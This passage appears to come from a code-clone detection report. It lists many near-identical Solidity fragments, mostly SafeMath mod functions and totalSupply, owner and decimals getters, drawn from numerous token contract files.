  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
<source file="systems/source-code/0xa322440a7b1718a9f343c943ab140e8e62345769.sol" startline="159" endline="162" pcid="5894">
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="263" endline="266" pcid="5800">
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="396" endline="399" pcid="1710">
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="264" endline="267" pcid="9246">
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="381" endline="388" pcid="5310">
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="262" endline="265" pcid="9092">
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
<source file="systems/source-code/0x36Ce9629522814955bc7CE5eAC7313BDFB6AC136.sol" startline="183" endline="186" pcid="1804">
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="263" endline="266" pcid="6396">
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="289" endline="296" pcid="4527">
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="296" endline="299" pcid="7009">
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="381" endline="388" pcid="7111">
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="381" endline="388" pcid="7568">
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="299" endline="302" pcid="7760">
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="263" endline="266" pcid="7899">
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="381" endline="388" pcid="510">
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="267" endline="270" pcid="8108">
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="267" endline="270" pcid="3684">
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="266" endline="269" pcid="8501">
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
</source>
</class>

<class classid="17" nclones="589" nlines="3" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="297" endline="299" pcid="19">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="271" endline="273" pcid="4764">
    function getOwner() external constant returns (address) {
        return owner;
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="129" endline="131" pcid="611">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x307121b525b8d83a37bf77c2c71c2a9e75ea7141.sol" startline="40" endline="42" pcid="1497">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="393" endline="395" pcid="7908">
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="58" endline="60" pcid="6837">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="58" endline="60" pcid="2623">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="331" endline="333" pcid="7010">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="60" endline="62" pcid="78">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="58" endline="60" pcid="3085">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="56" endline="58" pcid="2166">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="53" endline="55" pcid="8391">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="60" endline="62" pcid="5059">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="63" endline="65" pcid="5846">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="376" endline="378" pcid="3690">
  function decimals() external view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="51" endline="53" pcid="972">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="54" endline="56" pcid="7147">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="58" endline="60" pcid="3438">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="61" endline="63" pcid="575">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="56" endline="58" pcid="2446">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="56" endline="58" pcid="957">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="58" endline="60" pcid="801">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="55" endline="57" pcid="4314">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="54" endline="56" pcid="2341">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="316" endline="318" pcid="8109">
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="302" endline="304" pcid="3685">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="55" endline="57" pcid="3771">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x307121b525b8d83a37bf77c2c71c2a9e75ea7141.sol" startline="52" endline="54" pcid="1500">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="55" endline="57" pcid="5089">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="59" endline="61" pcid="6790">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="56" endline="58" pcid="5626">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="59" endline="61" pcid="1062">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="59" endline="61" pcid="7857">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="54" endline="56" pcid="7308">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="58" endline="60" pcid="676">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="54" endline="56" pcid="5716">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="58" endline="60" pcid="259">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="56" endline="58" pcid="430">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="371" endline="373" pcid="24">
  function decimals() external view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="55" endline="57" pcid="1545">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="51" endline="53" pcid="1623">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="58" endline="60" pcid="4222">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="56" endline="58" pcid="6331">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="58" endline="60" pcid="4642">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xA9c3D3fB7C16334230E696d07DB378FcE2F0Aa38.sol" startline="27" endline="29" pcid="6173">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="58" endline="60" pcid="7663">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="60" endline="62" pcid="4473">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="55" endline="57" pcid="661">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="275" endline="277" pcid="7405">
    function getOwner() external constant returns (address) {
        return owner;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="539" endline="541" pcid="4548">
    function stakeContract() public view returns (IStake) {
        return stake;
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="58" endline="60" pcid="9018">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="54" endline="56" pcid="8361">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="127" endline="129" pcid="3813">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="58" endline="60" pcid="9141">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="54" endline="56" pcid="1306">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="57" endline="59" pcid="691">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="55" endline="57" pcid="1032">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="58" endline="60" pcid="7514">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="54" endline="56" pcid="4130">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="374" endline="376" pcid="8507">
  function decimals() external view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="57" endline="59" pcid="1002">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="56" endline="58" pcid="3306">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="59" endline="61" pcid="6498">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="57" endline="59" pcid="6047">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="57" endline="59" pcid="5315">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="58" endline="60" pcid="4627">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x24982c94a024e5fb32eba94eda02404a89dadaef.sol" startline="52" endline="54" pcid="1122">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="61" endline="63" pcid="6101">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="54" endline="56" pcid="9189">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="57" endline="59" pcid="4854">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="58" endline="60" pcid="2973">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="56" endline="58" pcid="7323">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="56" endline="58" pcid="5213">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="56" endline="58" pcid="172">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="592" endline="594" pcid="4560">
    function getInSell() public view returns (bool) {
        return inSell;
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="130" endline="132" pcid="369">
    function totalSupply() public view returns (uint256) {
        return _supply;
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="61" endline="63" pcid="560">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="56" endline="58" pcid="8271">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="54" endline="56" pcid="4839">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="57" endline="59" pcid="122">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="54" endline="56" pcid="3902">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="54" endline="56" pcid="7618">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="59" endline="61" pcid="2401">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="484" endline="486" pcid="7889">
    function decimals() public view returns (uint8) {
      return _decimals;
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="58" endline="60" pcid="8908">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="54" endline="56" pcid="9204">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="55" endline="57" pcid="4384">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="57" endline="59" pcid="8794">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="300" endline="302" pcid="8502">
  function owner() public view returns (address) {
    return _owner;
  }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="57" endline="59" pcid="7162">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="56" endline="58" pcid="7956">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="474" endline="480" pcid="4536">
    function getAggregatorETHInterface()
        public
        view
        returns (AggregatorV3Interface)
    {
        return aggregatorETHInterface;
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="54" endline="56" pcid="8809">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="53" endline="55" pcid="8611">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="56" endline="58" pcid="4790">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x65D6C1d6d01CBB5D5f010e89E4eC6f3AFccB2C3a.sol" startline="27" endline="29" pcid="3828">
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="56" endline="58" pcid="2640">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="395" endline="397" pcid="8510">
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="38" endline="40" pcid="587">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="58" endline="60" pcid="3385">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="58" endline="60" pcid="816">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="58" endline="60" pcid="1560">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="55" endline="57" pcid="8548">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="58" endline="60" pcid="5143">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="56" endline="58" pcid="63">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="55" endline="57" pcid="5876">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x4B045C40Ed6b99FB4551522B95C97b7F7aB31371.sol" startline="35" endline="37" pcid="2809">
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="60" endline="62" pcid="2196">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="54" endline="56" pcid="5746">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="59" endline="61" pcid="2461">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="212" endline="214" pcid="1700">
    function owner() public view returns (address) {
        return _owner;
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="57" endline="59" pcid="6775">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="60" endline="62" pcid="4588">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="54" endline="56" pcid="8689">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="55" endline="57" pcid="209">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="408" endline="410" pcid="7766">
  function decimals() external view returns (uint8) {
    return _decimals;
  }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="59" endline="61" pcid="2245">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="54" endline="56" pcid="3881">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xa1754e6c03f9e03b36f416a585df4357247c2a83.sol" startline="52" endline="54" pcid="5841">
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="55" endline="57" pcid="2356">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="60" endline="62" pcid="3115">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0xe3294e522f9307592da7c9b290409772c6f89e5a.sol" startline="65" endline="67" pcid="8196">
    function decimals() public view returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="58" endline="60" pcid="8668">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="58" endline="60" pcid="327">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="57" endline="59" pcid="3250">
    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }
</source>
